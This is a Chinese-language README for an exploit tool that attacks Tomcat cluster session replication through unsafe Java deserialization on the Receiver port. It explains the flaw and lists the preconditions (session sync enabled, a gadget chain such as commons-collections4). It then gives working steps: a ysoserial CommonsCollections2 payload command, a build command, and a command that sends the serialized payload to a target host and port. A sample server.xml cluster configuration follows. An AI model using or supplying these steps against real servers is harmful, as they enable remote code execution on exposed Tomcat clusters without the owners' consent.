### tomcat session 同步exp

1. tomcat session 同步的时候会使用反序列化，这里tomcat没有做白名单处理，存在任意反序列化的问题
2. tomcat session 同步会开启一个端口接受反序列化数据，例如下文tomcat-session同步配置的<Receiver>节点的port就是开启的端口



### 使用

1、使用ysoserial( https://github.com/frohoff/ysoserial.git) 生成payload
```
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 "cmd /c notepad" > test.ser
```
2、构建本工程
```
mvn package
```
3、复制test.ser到本工程的目录下
```
java -jar tomcat-sesesion-syn-deserialization-1.0-SNAPSHOT-jar-with-dependencies.jar  -h ${同步session的ip} -p ${同步session的port} -f ${youre serialization file}
```

### 条件
1. tomcat启用了session同步
2. tomcat的classpath中存在可以序列化的利用链，比如commons-collections4

### tomcat-session同步配置
（conf/server.xml）：
```
<Engine>下面的配置放置到Engine节点下
        ...
        ...
	  <Cluster className="org.apache.catalina.ha.tcp.SimpleTcpCluster"  
                channelSendOptions="8">  
  
         <Manager className="org.apache.catalina.ha.session.DeltaManager"  
                  expireSessionsOnShutdown="false"  
                  notifyListenersOnReplication="true"/>  
  
         <Channel className="org.apache.catalina.tribes.group.GroupChannel">  
           <Membership className="org.apache.catalina.tribes.membership.McastService"  
                       address="228.0.0.4"  
                       port="45564"  
                       frequency="500"  
                       dropTime="3000"/>  
           <Receiver className="org.apache.catalina.tribes.transport.nio.NioReceiver"  
                     address="auto"  
                     port="4000"  
                     autoBind="100"  
                     selectorTimeout="5000"  
                     maxThreads="6"/>  
  
           <Sender className="org.apache.catalina.tribes.transport.ReplicationTransmitter">  
           <Transport className="org.apache.catalina.tribes.transport.nio.PooledParallelSender"/>  
           </Sender>  
           <Interceptor className="org.apache.catalina.tribes.group.interceptors.TcpFailureDetector"/>  
           <!--<Interceptor className="org.apache.catalina.tribes.group.interceptors.MessageDispatch15Interceptor"/>  -->
         </Channel>  
  
         <Valve className="org.apache.catalina.ha.tcp.ReplicationValve"  
                filter=""/>  
        <!-- <Valve className="org.apache.catalina.ha.session.JvmRouteBinderValve"/>  -->
  
         <Deployer className="org.apache.catalina.ha.deploy.FarmWarDeployer"  
                   tempDir="/tmp/war-temp/"  
                   deployDir="/tmp/war-deploy/"  
                   watchDir="/tmp/war-listen/"  
                   watchEnabled="false"/>  
  
         <!--<ClusterListener className="org.apache.catalina.ha.session.JvmRouteSessionIDBinderListener"/>  -->
         <ClusterListener className="org.apache.catalina.ha.session.ClusterSessionListener"/>  
       </Cluster>  
       ....
       ....
</Engine>
```
